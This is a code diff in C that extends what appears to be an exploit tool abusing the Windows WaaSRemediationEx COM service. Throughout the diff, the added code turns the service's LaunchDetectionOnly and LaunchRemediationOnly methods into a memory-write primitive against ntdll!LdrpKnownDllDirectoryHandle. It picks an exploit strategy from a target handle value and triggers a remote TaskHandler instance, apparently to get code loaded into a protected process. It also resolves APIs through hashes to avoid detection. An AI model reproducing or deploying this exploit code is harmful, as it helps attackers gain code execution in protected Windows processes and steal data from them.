@@ -230,11 +230,41 @@ HRESULT invoke_launch_remediation_only(
     return IWaaSRemediationEx_Invoke(Interface, DispId, &IID_Null, 1033, DISPATCH_METHOD, &Params, &VarResult, &ExcepInfo, &ArgErr);
 }
 
+HRESULT invoke_launch_detection_only(
+    IN PIWaaSRemediationEx Interface,
+    IN DISPID DispId,
+    IN BSTR CallerApplicationName,
+    IN ULONG_PTR Result)
+{
+    DISPPARAMS Params                    = { 0 };
+    VARIANT    VarResult                 = { 0 };
+    EXCEPINFO  ExcepInfo                 = { 0 };
+    UINT       ArgErr                    = 0xffffffff;
+    VARIANTARG ArgLaunchDetectionOnly[2] = { 0 };
+    IID        IID_Null                  = IID_ALL_ZERO;
+
+    memset(&ArgLaunchDetectionOnly, 0, sizeof(ArgLaunchDetectionOnly));
+    ArgLaunchDetectionOnly[0].vt = VT_UI8;
+    ArgLaunchDetectionOnly[0].ullVal = Result;
+    ArgLaunchDetectionOnly[1].vt = VT_BSTR;
+    ArgLaunchDetectionOnly[1].bstrVal = CallerApplicationName;
+
+    memset(&Params, 0, sizeof(Params));
+    Params.cArgs = sizeof(ArgLaunchDetectionOnly) / sizeof(*ArgLaunchDetectionOnly);
+    Params.rgvarg = ArgLaunchDetectionOnly;
+    Params.cNamedArgs = 0;
+    Params.rgdispidNamedArgs = NULL;
+
+    return IWaaSRemediationEx_Invoke(Interface, DispId, &IID_Null, 1033, DISPATCH_METHOD, &Params, &VarResult, &ExcepInfo, &ArgErr);
+}
+
 BOOL calculate_write_addresses(
     IN PVOID BaseAddress,
+    IN ULONG32 TargetValue,
     OUT PDWORD64 WriteAtLaunchDetectionOnly,
     OUT PDWORD64 WriteAtLaunchRemediationOnly)
 {
+    ULONG32 Strategy = 0;
     //
     // _BaseAddress: address of ntdll!LdrpKnownDllDirectoryHandle
     // _WriteAtLaunchDetectionOnly: address used to write the result of LaunchDetectionOnly
@@ -270,16 +300,30 @@ BOOL calculate_write_addresses(
     //     00007fff`971dc038  00 00 00 00  00 00 00 00    <- NOT USED
     //
 
-    // TODO: implement strategy
-    //if (_Strategy == ExploitStrategy::ExtractByteAtIndex0)
-    if (TRUE)
+    //
+    // If the target handle value is 0x18, 0x38, 0x58 (etc.), we have a higher chance of hitting
+    // the right value if we extract the first byte (index 0) of the returned heap address.
+    //
+    if (TargetValue >= 0x18)
+    {
+        Strategy = ((TargetValue - 0x18) % 32 == 0) ? EXPLOIT_STRATEGY_EXTRACT_BYTE_AT_INDEX_0 : EXPLOIT_STRATEGY_EXTRACT_BYTE_AT_INDEX_1;
+    }
+    //
+    // Otherwise, extract the second byte (index 1) of the returned heap address.
+    //
+    else
+    {
+        Strategy = EXPLOIT_STRATEGY_EXTRACT_BYTE_AT_INDEX_1;
+    }
+
+
+    if (Strategy == EXPLOIT_STRATEGY_EXTRACT_BYTE_AT_INDEX_0)
     {
         *WriteAtLaunchDetectionOnly = (DWORD64)(ULONG_PTR)BaseAddress;       // Write value XX XX XX XX XX XX 00 00 @ ntdll!LdrpKnownDllDirectoryHandle
         *WriteAtLaunchRemediationOnly = (DWORD64)(ULONG_PTR)BaseAddress - 7; // Write 00 00 00 00 @ LdrpKnownDllDirectoryHandle+1 (+1 again for the second call)
         return TRUE;
     }
-    //else if (_Strategy == ExploitStrategy::ExtractByteAtIndex1)
-    else
+    else if (Strategy == EXPLOIT_STRATEGY_EXTRACT_BYTE_AT_INDEX_1)
     {
         *WriteAtLaunchDetectionOnly = (DWORD64)(ULONG_PTR)BaseAddress - 1;   // Write value XX XX XX XX XX XX 00 00 @ ntdll!LdrpKnownDllDirectoryHandle-1
         *WriteAtLaunchRemediationOnly = (DWORD64)(ULONG_PTR)BaseAddress - 7; // Write 00 00 00 00 @ LdrpKnownDllDirectoryHandle+1
@@ -405,6 +449,230 @@ cleanup:
     if (ret_val)
     {
         DPRINT("DLL search path flag address: 0x%p", (PVOID)*Address);
+    }
+
+    return ret_val;
+}
+
+DWORD WINAPI write_remote_known_dll_handle_thread(LPVOID Parameter)
+{
+    PWRITE_REMOTE_KNOWN_DLL_HANDLE_PARAM WriteParams = (PWRITE_REMOTE_KNOWN_DLL_HANDLE_PARAM)Parameter;
+    HRESULT                              hr          = 0;
+
+    hr = invoke_launch_detection_only(
+        WriteParams->WaaSRemediationEx,
+        WriteParams->DispIdLaunchDetectionOnly,
+        WriteParams->CallerApplicationName,
+        WriteParams->WriteAtLaunchDetectionOnly);
+
+    if (FAILED(hr))
+    {
+        DPRINT("LaunchDetectionOnly(0x%p): 0x%08lx", (PVOID)WriteParams->WriteAtLaunchDetectionOnly, hr);
+        return (DWORD)hr;
+    }
+
+    hr = invoke_launch_remediation_only(
+        WriteParams->WaaSRemediationEx,
+        WriteParams->DispIdLaunchRemediationOnly,
+        WriteParams->Plugins,
+        WriteParams->CallerApplicationName,
+        WriteParams->WriteAtLaunchRemediationOnly);
+
+    if (FAILED(hr))
+    {
+        DPRINT("LaunchRemediationOnly(0x%p): 0x%08lx", (PVOID)WriteParams->WriteAtLaunchRemediationOnly, hr);
+        return (DWORD)hr;
+    }
+
+    if (WriteParams->Strategy == EXPLOIT_STRATEGY_EXTRACT_BYTE_AT_INDEX_0)
+    {
+        hr = invoke_launch_remediation_only(
+            WriteParams->WaaSRemediationEx,
+            WriteParams->DispIdLaunchRemediationOnly,
+            WriteParams->Plugins,
+            WriteParams->CallerApplicationName,
+            WriteParams->WriteAtLaunchRemediationOnly + 1);
+
+        if (FAILED(hr))
+        {
+            DPRINT("LaunchRemediationOnly(0x%p): 0x%08lx", (PVOID)WriteParams->WriteAtLaunchRemediationOnly, hr);
+            return (DWORD)hr;
+        }
+    }
+
+    return ERROR_SUCCESS;
+}
+
+BOOL write_remote_known_dll_handle(
+    IN PIWaaSRemediationEx IWaaSRemediationEx,
+    IN LONG TargetValue,
+    IN DISPID DispIdLaunchDetectionOnly,
+    IN DISPID DispIdLaunchRemediationOnly,
+    IN DWORD64 WriteAtLaunchDetectionOnly,
+    IN DWORD64 WriteAtLaunchRemediationOnly)
+{
+    BOOL                                ret_val          = FALSE;
+    BOOL                                success          = FALSE;
+    WRITE_REMOTE_KNOWN_DLL_HANDLE_PARAM WriteParams      = { 0 };
+    DWORD                               dwThreadId       = 0;
+    DWORD                               dwThreadExitCode = ERROR_SUCCESS;
+    HANDLE                              hThread          = NULL;
+
+    CoCancelCall_t   CoCancelCall   = NULL;
+    SysAllocString_t SysAllocString = NULL;
+
+    SysAllocString = (SysAllocString_t)(ULONG_PTR)get_function_address(
+        get_library_address(OLEAUT32_DLL, TRUE),
+        SysAllocString_SW2_HASH,
+        0);
+    if (!SysAllocString)
+    {
+        api_not_found("SysAllocString");
+        goto cleanup;
+    }
+
+    CoCancelCall = (CoCancelCall_t)(ULONG_PTR)get_function_address(
+        get_library_address(OLE32_DLL, TRUE),
+        CoCancelCall_SW2_HASH,
+        0);
+    if (!CoCancelCall)
+    {
+        api_not_found("CoCancelCall");
+        goto cleanup;
+    }
+
+    memset(&WriteParams, 0, sizeof(WriteParams));
+    WriteParams.CallerApplicationName       = SysAllocString(L"");
+    WriteParams.Plugins                     = SysAllocString(L"");
+    WriteParams.DispIdLaunchDetectionOnly   = DispIdLaunchDetectionOnly;
+    WriteParams.DispIdLaunchRemediationOnly = DispIdLaunchRemediationOnly;
+
+    //
+    // If the target handle value is 0x18, 0x38, 0x58 (etc.), we have a higher chance of hitting
+    // the right value if we extract the first byte (index 0) of the returned heap address.
+    //
+    if (TargetValue >= 0x18)
+    {
+        WriteParams.Strategy = ((TargetValue - 0x18) % 32 == 0) ? EXPLOIT_STRATEGY_EXTRACT_BYTE_AT_INDEX_0 : EXPLOIT_STRATEGY_EXTRACT_BYTE_AT_INDEX_1;
+    }
+    //
+    // Otherwise, extract the second byte (index 1) of the returned heap address.
+    //
+    else
+    {
+        WriteParams.Strategy = EXPLOIT_STRATEGY_EXTRACT_BYTE_AT_INDEX_1;
+    }
+
+    WriteParams.WaaSRemediationEx            = IWaaSRemediationEx;
+    WriteParams.WriteAtLaunchDetectionOnly   = WriteAtLaunchDetectionOnly;
+    WriteParams.WriteAtLaunchRemediationOnly = WriteAtLaunchRemediationOnly;
+
+    hThread = CreateThread(NULL, 0, write_remote_known_dll_handle_thread, &WriteParams, 0, &dwThreadId);
+    if (!hThread)
+    {
+        function_failed("CreateThread");
+        goto cleanup;
+    }
+
+    if (WaitForSingleObject(hThread, TIMEOUT) != WAIT_OBJECT_0)
+    {
+        DPRINT("Thread with ID %ld is taking too long, cancelling...", dwThreadId);
+        CoCancelCall(dwThreadId, TIMEOUT);
+        goto cleanup;
+    }
+
+    success = GetExitCodeThread(hThread, &dwThreadExitCode);
+    if (!success)
+        goto cleanup;
+
+    if (dwThreadExitCode != ERROR_SUCCESS)
+        goto cleanup;
+
+    ret_val = TRUE;
+
+cleanup:
+    safe_close_handle(&hThread);
+
+    if (!ret_val)
+    {
+        DPRINT_ERR("Failed to write LdrpKnownDllDirectoryHandle value (thread exit code: 0x%08lx).", dwThreadExitCode);
+    }
+
+    return ret_val;
+
+}
+
+DWORD WINAPI create_task_handler_instance_thread(LPVOID Parameter)
+{
+    PITaskHandler pTaskHandler          = NULL;
+    HRESULT       hr                    = E_FAIL;
+    CLSID         CLSID_WaaSRemediation = CLSID_WAASREMEDIATION;
+    IID           IID_TaskHandler       = IID_TASKHANDLER;
+
+    CoCreateInstance_t CoCreateInstance = NULL;
+
+    CoCreateInstance = (CoCreateInstance_t)(ULONG_PTR)get_function_address(
+        get_library_address(OLE32_DLL, TRUE),
+        CoCreateInstance_SW2_HASH,
+        0);
+    if (!CoCreateInstance)
+    {
+        api_not_found("CoCreateInstance");
+        goto cleanup;
+    }
+
+    hr = CoCreateInstance(
+        &CLSID_WaaSRemediation,
+        NULL,
+        CLSCTX_LOCAL_SERVER,
+        &IID_TaskHandler,
+        (LPVOID *)&pTaskHandler);
+    if (SUCCEEDED(hr))
+    {
+        ITaskHandler_Release(pTaskHandler);
+    }
+
+cleanup:
+    return (DWORD)hr;
+}
+
+BOOL create_task_handler_instance()
+{
+    BOOL    ret_val    = FALSE;
+    HANDLE  hThread    = NULL;
+    DWORD   dwThreadId = 0;
+
+    CoCancelCall_t CoCancelCall = NULL;
+
+    CoCancelCall = (CoCancelCall_t)(ULONG_PTR)get_function_address(
+        get_library_address(OLE32_DLL, TRUE),
+        CoCancelCall_SW2_HASH,
+        0);
+    if (!CoCancelCall)
+    {
+        api_not_found("CoCancelCall");
+        goto cleanup;
+    }
+
+    hThread = CreateThread(NULL, 0, create_task_handler_instance_thread, NULL, 0, &dwThreadId);
+    if (!hThread)
+        goto cleanup;
+
+    if (WaitForSingleObject(hThread, TIMEOUT) != WAIT_OBJECT_0)
+    {
+        DPRINT("Thread with ID %ld is taking too long, cancelling...", dwThreadId);
+        CoCancelCall(dwThreadId, TIMEOUT);
+        goto cleanup;
+    }
+
+    ret_val = TRUE;
+
+cleanup:
+    safe_close_handle(&hThread);
+
+    if (!ret_val)
+    {
+        DPRINT_ERR("Unexpected error or timeout while trying to create a remote TaskHandler instance.");
     }
 
     return ret_val;
